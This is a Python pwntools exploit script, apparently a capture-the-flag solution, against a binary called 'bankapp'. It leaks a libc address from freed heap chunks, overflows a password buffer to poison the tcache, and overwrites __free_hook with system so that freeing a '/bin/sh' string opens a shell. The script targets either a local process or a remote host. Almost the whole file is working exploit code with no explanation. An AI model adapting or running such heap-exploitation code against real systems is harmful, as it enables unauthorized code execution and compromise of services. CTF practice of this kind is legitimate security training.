#!/usr/bin/env python2
from pwn import *

# Definitions
e = context.binary = ELF('./bankapp',checksec=False)
libc = ELF('./libc-2.31.so',checksec=False)
context.terminal = ['terminator','-e']
secret_key = [4,6,3,5,2,1,4,2,5,1]

if args.REMOTE:
    timeout = 0.4
    io = remote('35.202.156.135',20101)
else:
    timeout = 0.01
    io = process(e.path)
    context.log_level = 'DEBUG'

def login(id,pswd):
    io.recvrepeat(timeout)
    io.sendline('1')
    io.recvrepeat(timeout)
    io.sendline(str(id))
    io.recvrepeat(timeout)
    io.sendline(pswd)

def register(usrlen,user,pswdlen,pswd,balance = 1000):
    io.recvrepeat(timeout)
    io.sendline('2')
    io.recvrepeat(timeout)
    io.sendline(str(usrlen))
    io.recvrepeat(timeout)
    io.sendline(user)
    io.recvrepeat(timeout)
    io.sendline(str(pswdlen))
    io.recvrepeat(timeout)
    io.sendline(pswd)
    io.recvrepeat(timeout)
    io.sendline(str(balance))

def change_pass(pswd,pswdlen):
    io.recvrepeat(timeout)
    io.sendline('4')
    io.recvrepeat(timeout)
    io.sendline(pswd)
    io.recvrepeat(timeout)
    io.sendline('1')
    io.recvrepeat(timeout)
    io.sendline(str(pswdlen))

def logout():
    io.sendline('6')

def delete():
    io.sendline('5')
    io.sendline('1')

def encode(payload):
    _p = ''
    j = 0
    for i in range(len(payload)):
        _p += chr(ord(payload[i]) - secret_key[j])
        if j >= 9:
            j = 0
        else:
            j += 1
    return _p

# Exploit
def parse_leak():
    io.recvuntil(8*'A')
    leak = u64(io.recv(6).ljust(8,'\x00')) - 0x1bebe0
    return leak

def leak_libc():
    io.recvrepeat(timeout)
    io.sendline('2')
    io.recvrepeat(timeout)
    io.sendline(str(0x90))
    io.recv(0xb)
    io.send(8*'A')
    io.recvrepeat(timeout)
    io.sendline(str(0x90))
    io.recvline(timeout)
    io.sendline('0xten')
    io.recvrepeat(timeout)
    io.sendline('1000')
    login('4','0xten')
    libc.address = parse_leak()
    delete()

def prep():

    # Leak libc
    log.success('Leaking libc')
    for i in range(5):
        register(0x90,'0xten',0x90,'0xten')
    for i in range(5):
        login(i,'0xten')
        delete()
    for i in range(4):
        register(0x90,'0xten',0x90,'0xten')
    leak_libc()
    log.success('Libc: ' + hex(libc.address))
    for i in range(4):
        login(i,'0xten')
        delete()

def pwn():

    # Heap overflow
    log.success('Triggering overflow')
    register(20,'0xten',20,'0xten')
    register(20,'0xten',20,'0xten')
    register(20,'0xten',20,'0xten')
    login(2,'0xten')
    delete()
    login(1,'0xten')
    delete()
    login(0,'0xten')

    # Poison tcache
    log.success('Poisoning tcache')
    change_pass(encode(32*'B'+p64(libc.sym['__free_hook'])[:6]),21)
    logout()
    register(20,'/bin/sh',20,'0xten')
    register(32,'0xten',16,encode(p64(libc.sym['system'])[:6])+'\x00\x00')
    login(1,'0xten')
    log.success('Popping shell')
    delete()
    io.recv(2048)

prep()
pwn()
io.interactive()